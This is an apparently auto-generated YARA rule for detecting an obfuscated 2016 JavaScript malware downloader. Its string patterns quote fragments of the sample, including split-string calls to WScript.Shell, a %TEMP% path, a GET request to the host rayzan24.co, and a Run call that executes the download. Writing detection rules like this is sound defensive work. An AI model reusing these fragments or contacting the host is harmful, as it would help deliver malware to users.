rule sig_20160427_32f1aeeb04b8dedbd8757c0fa9e91126 {
  meta:
    description = "datamaliciousorder - file 20160427_32f1aeeb04b8dedbd8757c0fa9e91126.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b193a520392e1bf9a6128a147ddc236f5967f38c5629c06a23e3f400d63e332a"

  strings:
    $s1  = "function AqgtcBqiua() {return PeffzClcdu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"Req5Tya" ascii
    $s2  = "function AqgtcBqiua() {return PeffzClcdu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"Req5Tya" ascii
    $s3  = "var PeffzClcdu = function ZnqweYqper() {return PqrodFfdxu[YlmabDwoim](\"WScript\"+\".Shell\");}(), LoocuMippr = 11;" fullword ascii
    $s4  = "function JayeuSzsjt(ShiwbQwuzh, TqgfpLygmg){QkzudZwlrc = QkzudZwlrc * 1; return ShiwbQwuzh - TqgfpLygmg;};" fullword ascii
    $s5  = "ZqvzbUzsoz[VamvjBijpc](\"G\" + \"ET\", \"http://rayzan24.co/m3usjd\", false);" fullword ascii
    $s6  = "var PqrodFfdxu = this[\"WScript\"];" fullword ascii
    $s7  = "if (ZqvzbUzsoz[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function CpapoXghxm(){return SxngdXpwbb + \"\";};" fullword ascii
    $s9  = "function KyphqWsfat() {return ((KtkppKjpzs == true) && (KtkppKjpzs == TweviSrqpp)) ? 1 : QkzudZwlrc;};" fullword ascii
    $s10 = "var LjvzqFgmtw = new this[\"D\"+\"ate\"]();" fullword ascii
    $s11 = "function HroncGcplp()" fullword ascii
    $s12 = "function NanpsEhohy(XtsqjFiymv) {var QfqreOudpp = (1, 2, 3, 4, 5, XtsqjFiymv); return QfqreOudpp;};" fullword ascii
    $s13 = "function UkofmOernr(){return YlmabDwoim;};" fullword ascii
    $s14 = "var KtkppKjpzs = false;" fullword ascii
    $s15 = "KtkppKjpzs = true; " fullword ascii
    $s16 = "var TweviSrqpp = false;" fullword ascii
    $s17 = "}while (UostvQwmnt);" fullword ascii
    $s18 = "var YrwmeGmkpx = false;" fullword ascii
    $s19 = "function TprayXswqo(JntdmJiinw){PeffzClcdu[\"R\"+\"un\"](JntdmJiinw, QkzudZwlrc, QkzudZwlrc);};" fullword ascii
    $s20 = "TweviSrqpp = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}